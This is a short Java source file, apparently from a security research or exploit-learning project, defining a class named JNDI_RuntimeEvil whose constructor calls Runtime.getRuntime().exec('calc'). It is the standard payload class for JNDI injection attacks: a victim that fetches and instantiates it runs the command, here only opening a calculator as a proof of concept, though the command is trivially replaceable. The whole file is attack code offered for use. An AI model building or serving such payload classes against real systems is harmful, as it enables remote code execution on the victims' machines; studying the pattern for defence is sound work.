
import java.io.IOException;
import java.rmi.RemoteException;

public class JNDI_RuntimeEvil{
    public JNDI_RuntimeEvil() throws RemoteException {
        try {
            Runtime.getRuntime().exec("calc");
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }
}
